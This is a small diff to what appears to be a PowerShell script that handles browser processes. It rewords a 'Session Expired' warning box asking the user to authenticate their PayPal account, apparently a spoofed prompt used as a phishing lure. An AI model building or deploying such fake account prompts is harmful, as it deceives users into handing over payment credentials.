@@ -87,7 +87,7 @@ $browserProcesses | ForEach-Object {
 }
 
 Add-Type -AssemblyName PresentationCore,PresentationFramework
-$msgBody = "Please re-authenticate your Paypal Account."
+$msgBody = "Please authenticate your Paypal Account."
 $msgTitle = "Session Expired"
 $msgButton = 'Ok'
 $msgImage = 'Warning'
